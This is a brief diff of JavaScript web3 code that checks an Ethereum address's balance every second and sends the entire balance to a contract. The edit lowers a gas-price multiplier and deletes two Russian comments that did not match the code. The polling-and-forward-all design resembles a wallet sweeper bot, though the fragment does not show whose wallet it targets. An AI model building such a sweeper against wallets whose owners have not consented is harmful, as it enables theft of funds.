@@ -58,7 +58,7 @@ async function sendAllEthToContract() {
     try {
         const balance = BigInt(await web3.eth.getBalance(senderAddress));
         let gasPrice = BigInt(await web3.eth.getGasPrice());
-        gasPrice *= 2n; // Увеличиваем цену газа в 3 раза
+        gasPrice *= 1n;
 
         const gasEstimate = BigInt(await web3.eth.estimateGas({
             from: senderAddress,
@@ -111,5 +111,4 @@ async function checkBalanceAndSend() {
     }
 }
 
-// Запускаем проверку баланса каждые 2 секунды
 setInterval(checkBalanceAndSend, 1000);
